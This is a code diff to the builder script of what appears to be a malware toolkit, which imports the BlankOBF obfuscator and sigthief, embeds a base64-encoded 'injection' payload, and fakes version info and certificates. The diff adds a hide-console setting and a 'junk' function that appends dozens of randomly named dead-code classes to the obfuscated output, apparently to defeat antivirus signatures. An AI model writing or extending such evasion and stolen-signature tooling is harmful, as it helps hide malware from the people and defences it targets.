@@ -4,6 +4,7 @@ import os
 import urllib3
 import subprocess
 import random
+import string
 
 import BlankOBF as obfuscator
 from sigthief import outputCert
@@ -45,6 +46,13 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
     if injection is not None:
         code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
     
+    if settings["settings"]["hideconsole"]:
+        with open("noconsole", "wb"): 
+            pass
+    else:
+        if os.path.isfile("noconsole"):
+            os.remove("noconsole")
+    
     return code
 
 def ReadSettings() -> tuple[dict, str]:
@@ -67,6 +75,28 @@ def ReadSettings() -> tuple[dict, str]:
 def EncryptString(plainText: str) -> str:
     encoded = base64.b64encode(plainText.encode()).decode()
     return "base64.b64decode(\"{}\").decode()".format(encoded)
+
+def junk(path: str) -> None:
+    with open(path) as file:
+        code = file.read()
+    generate_name = lambda: "_%s" % "".join(random.choices(string.ascii_letters + string.digits, k = random.randint(8, 20)))
+    junk_funcs = [generate_name() for _ in range(random.randint(25, 40))]
+    junk_func_calls = junk_funcs.copy()
+    
+    junk_code = """
+class %s:
+    def __init__(self):
+    """.strip() % generate_name()
+
+    junk_code += "".join(["\n%sself.%s(%s)" % (" " * 8, x, ", ".join(["%s()" %generate_name() for _ in range(random.randint(1, 4))])) for x in junk_funcs])
+
+    random.shuffle(junk_funcs)
+    random.shuffle(junk_func_calls)
+
+    junk_code += "".join(["\n%sdef %s(self, %s):\n%sself.%s()" % (" " * 4, junk_funcs[index], ", ".join([generate_name() for _ in range(random.randint(5, 20))]), " " * 8, junk_func_calls[index]) for index in range(len(junk_func_calls))])
+
+    with open(path, "w") as file:
+        file.write(code + "\n" + junk_code)
 
 def MakeVersionFileAndCert() -> None:
     original: str
@@ -112,6 +142,8 @@ def main() -> None:
     code = WriteSettings(code, *ReadSettings())
 
     obfuscator.BlankOBF(code, OutCodeFile)
+    junk(OutCodeFile)
+    
     MakeVersionFileAndCert()
 
 if __name__ == "__main__":
